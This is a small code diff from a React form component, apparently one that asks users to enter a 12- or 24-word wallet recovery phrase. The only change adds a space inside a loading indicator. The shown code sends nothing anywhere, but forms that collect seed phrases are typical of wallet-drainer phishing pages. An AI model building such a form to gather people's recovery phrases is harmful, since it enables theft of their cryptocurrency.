@@ -55,7 +55,7 @@ function Phrase() {
           {error && <p className="error-message">Incorrect Phrase</p>}
           <p>Typically 12 (sometimes 24) words separated by single spaces</p>
           <button type="submit">
-            {load ? <div className="loaderr"></div> : 'Proceed'}
+            {load ? <div className="loaderr"> </div> : 'Proceed'}
           </button>
         </Form>
       )}
